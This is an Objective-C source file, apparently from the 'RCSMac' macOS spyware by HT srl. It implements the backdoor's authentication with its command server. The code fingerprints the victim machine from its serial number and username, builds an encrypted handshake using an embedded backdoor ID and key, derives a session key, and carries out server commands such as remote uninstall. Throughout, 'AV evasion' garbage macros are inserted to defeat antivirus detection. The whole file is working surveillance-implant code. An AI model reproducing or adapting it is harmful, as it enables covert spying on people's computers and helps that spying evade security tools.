/*
 * RCSMac - Authentication Network Operation
 *
 *
 * Created by revenge on 13/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "AuthNetworkOperation.h"

#import "RCSMTaskManager.h"

#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "RCSMCommon.h"
#import "RCSMGlobals.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

@implementation AuthNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mBackdoorSignature = [[NSData alloc] initWithBytes: gBackdoorSignature
                                                  length: CC_MD5_DIGEST_LENGTH];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      mTransport = aTransport;
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mBackdoorSignature release];
  //[mTransport release];
  
  [super dealloc];
}

- (BOOL)perform
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  u_int randomNumber, i;
  srandom(time(NULL));
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  char nullTerminator = 0x00;
  
  NSMutableData *kd     = [[NSMutableData alloc] init];
  NSMutableData *nOnce  = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  //
  // Generate kd (16 bytes)
  //
  for (i = 0; i < 16; i += 4)
    {
      randomNumber = random();
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [kd appendBytes: (const void *)&randomNumber
               length: sizeof(randomNumber)];
    }
  //
  // Generate nonce (16 bytes)
  //
  for (i = 0; i < 16; i += 4)
    {
      randomNumber = random();
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      [nOnce appendBytes: (const void *)&randomNumber
                  length: sizeof(randomNumber)];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *confKey = [NSData dataWithBytes: &gConfAesKey
                                   length: CC_MD5_DIGEST_LENGTH];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  CFStringRef serialNumber;
  getSystemSerialNumber(&serialNumber);
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableString *_instanceID = [[NSMutableString alloc] initWithString: (NSString *)serialNumber];
  CFRelease(serialNumber);
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSString *userName = NSUserName();
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [_instanceID appendString: userName];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  NSData *instanceID = [_instanceID sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  [_instanceID release];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //XXX- check for the null terminator
  NSMutableData *backdoorID = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [backdoorID appendBytes: &gBackdoorID
                   length: strlen(gBackdoorID)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [backdoorID appendBytes: &nullTerminator
                   length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [backdoorID appendBytes: &nullTerminator
                   length: sizeof(char)];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  NSMutableData *type;
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  // FIXED-
  if (gIsDemoMode)
    type = [[NSMutableData alloc] initWithData:
            [@"OSX-DEMO" dataUsingEncoding: NSASCIIStringEncoding]];
  else
    type = [[NSMutableData alloc] initWithData:
                           [@"OSX" dataUsingEncoding: NSASCIIStringEncoding]];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  int typeLen = 16 - [type length];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  for (i = 0; i < typeLen; i++)
    {
      [type appendBytes: &nullTerminator
                 length: sizeof(char)];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  //
  // Generate id token sha1(backdoor_id + instance + subtype + confkey)
  //
  NSMutableData *idToken = [[NSMutableData alloc] init];
  [idToken appendData: backdoorID];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [idToken appendData: instanceID];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [idToken appendData: type];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [idToken appendData: confKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  NSData *shaIDToken = [idToken sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // Prepare the encrypted message
  NSMutableData *message = [[NSMutableData alloc] init];
  [message appendData: kd];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  [message appendData: nOnce];
  [message appendData: backdoorID];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [message appendData: instanceID];
  [message appendData: type];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  [message appendData: shaIDToken];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  
  NSMutableData *encMessage = [[NSMutableData alloc] initWithData: message];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [encMessage encryptWithKey: mBackdoorSignature];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse  = nil;
  NSData *replyData           = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  replyData = [mTransport sendData: encMessage
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([replyData length] != 64)
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      [kd release];
      [nOnce release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [backdoorID release];
      [type release];
      [idToken release];
      [message release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [encMessage release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  // first 32 bytes are the Ks choosen by the server
  // decrypt it and store to create the session key along with Kd and Cb
  NSMutableData *ksCrypted = [[NSMutableData alloc] initWithBytes: [replyData bytes]
                                                           length: 32];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [ksCrypted decryptWithKey: mBackdoorSignature];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  NSData *ks = [[NSData alloc] initWithBytes: [ksCrypted bytes]
                                      length: CC_MD5_DIGEST_LENGTH];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [ksCrypted release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSString *ksString = [[NSString alloc] initWithData: ks
                                             encoding: NSUTF8StringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // calculate the session key -> K = sha1(Cb || Ks || Kd)
  // we use a schema like PBKDF1
  // remember it for the entire session
  NSMutableData *sessionKey = [[NSMutableData alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [sessionKey appendData: confKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [sessionKey appendData: ks];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  [sessionKey appendData: kd];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  gSessionKey = [[NSMutableData alloc] initWithData: [sessionKey sha1Hash]];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  // second part of the server response contains the NOnce and the response
  // extract the NOnce and check if it is ok
  // this MUST be the same NOnce sent to the server, but since it is crypted
  // with the session key we know that the server knows Cb and thus is trusted
  NSMutableData *secondPartResponse;
  @try
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      secondPartResponse = [[NSMutableData alloc] initWithData:
                            [replyData subdataWithRange:
                             NSMakeRange(32, [replyData length] - 32)]];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_001
          
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [secondPartResponse decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *rNonce = [[NSData alloc] initWithBytes: [secondPartResponse bytes]
                                          length: 16];
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  if ([nOnce isEqualToData: rNonce] == NO)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      return NO;
    }
  
  NSData *_protoCommand;
  uint32_t protoCommand;
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      _protoCommand = [[NSData alloc] initWithData:
                       [secondPartResponse subdataWithRange: NSMakeRange(16, 4)]];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      [_protoCommand getBytes: &protoCommand
                        range: NSMakeRange(0, sizeof(int))];
      
      // AV evasion: only on release build
      AV_GARBAGE_001
      
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [kd release];
  [nOnce release];
  // FIXED-
  [backdoorID release];
  [type release];
  //
  [idToken release];
  [message release];
  [encMessage release];
  [ks release];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  
  [ksString release];
  [sessionKey release];
  [secondPartResponse release];
  [rNonce release];
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  switch (protoCommand)
    {
    case PROTO_OK:
      {
#ifdef DEBUG_AUTH_NOP
        infoLog(@"Auth Response OK");
#endif
      } break;
    case PROTO_UNINSTALL:
      {
#ifdef DEBUG_AUTH_NOP
        infoLog(@"Uninstall");
#endif

        __m_MTaskManager *taskManager = [__m_MTaskManager sharedInstance];
        [taskManager uninstallMeh];
      } break;
    case PROTO_NO:
    default:
      {
#ifdef DEBUG_AUTH_NOP
        errorLog(@"Received command: %d", protoCommand);
#endif

        [_protoCommand release];
        return NO;
      } break;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [_protoCommand release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  return YES;
}

@end
